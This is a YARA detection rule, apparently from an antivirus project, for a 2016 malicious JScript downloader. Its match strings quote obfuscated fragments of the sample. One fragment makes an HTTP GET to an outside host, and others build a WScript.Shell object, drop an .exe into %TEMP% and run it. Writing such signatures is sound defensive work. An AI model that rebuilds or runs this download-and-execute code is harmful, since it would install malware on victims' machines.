rule sig_20160330_1d64fde6be6f514665ba027e8b3b7699 {
  meta:
    description = "datamaliciousorder - file 20160330_1d64fde6be6f514665ba027e8b3b7699.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8bbe8cc0e4470d5114eb88761728670a7e76e66a7dabe2f9c8a5fd86c9288091"

  strings:
    $s1  = "_JU[_D0](\"GET\", \"http://hollandfoodexchange.com/d7jsa\", false);" fullword ascii
    $s2  = "function _X0(_JZ, _I){_R0 = _R0 * 1; return _JZ - _I;};" fullword ascii
    $s3  = "var _M0 = function _H() {return WScript[_PO](\"WScript\"+\".Shell\");}(), _QZ = 11;" fullword ascii
    $s4  = "if (_JU[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _X() {return _M0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"G04F803oINd1rKFg.ex\" + \"e\";};" fullword ascii
    $s6  = "function _D(){return _G + \"\";};" fullword ascii
    $s7  = "function _S() {return ((_ON == true) && (_ON == _BF)) ? 1 : _R0;};" fullword ascii
    $s8  = "function _VA(_F){_M0[\"Run\"](_F, _R0, _R0);};" fullword ascii
    $s9  = " while (_M){" fullword ascii
    $s10 = "function _L(){return _PO;};" fullword ascii
    $s11 = "return _X0(_L0, _MK);" fullword ascii
    $s12 = "function _W(){return 22;};" fullword ascii
    $s13 = "function _DR()" fullword ascii
    $s14 = "var _AP = new this[\"Date\"]();" fullword ascii
    $s15 = "function _P(_V) {var _W0 = (1, 2, 3, 4, 5, _V); return _W0;};" fullword ascii
    $s16 = "var _ON = false;" fullword ascii
    $s17 = "var _BF = false;" fullword ascii
    $s18 = "var _SC = false;" fullword ascii
    $s19 = "_BF = true; " fullword ascii
    $s20 = "_ON = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}